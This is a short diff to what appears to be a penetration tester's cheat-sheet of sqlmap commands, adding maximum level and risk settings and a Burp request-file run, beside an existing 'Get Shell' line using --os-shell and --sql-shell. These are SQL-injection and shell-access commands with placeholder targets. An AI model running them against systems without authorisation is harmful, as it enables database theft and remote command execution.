@@ -1,7 +1,10 @@
 % sql, sqlmap
 
 # Basic usage
-sqlmap -u <url>
+sqlmap -u <url> --level 5 --risk 3
+
+# Use Burp request file
+sqlmap -r <file.req> --batch
 
 # Get Shell
 sqlmap -u <url> --batch --banner --os-shell --sql-shell
